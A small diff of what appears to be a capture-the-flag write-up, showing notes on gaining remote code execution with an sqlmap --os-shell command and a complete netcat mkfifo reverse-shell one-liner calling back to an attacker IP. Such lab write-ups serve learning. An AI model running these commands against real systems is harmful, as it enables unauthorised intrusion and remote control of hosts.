@@ -84,6 +84,7 @@ sqlmap -u http://10.129.179.238/dashboard.php?search=hello --os-shell  --cookie=
 We got RCE!! --> Try to get a properly shell, this sqlmap shell keep asking about how to output stuff, so stupid!!
 
 Using python reverse shell -> turn sqlmap shell off --> lost it
+
 Using nc --> We're fine --> OK!!
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.198 8888 >/tmp/f
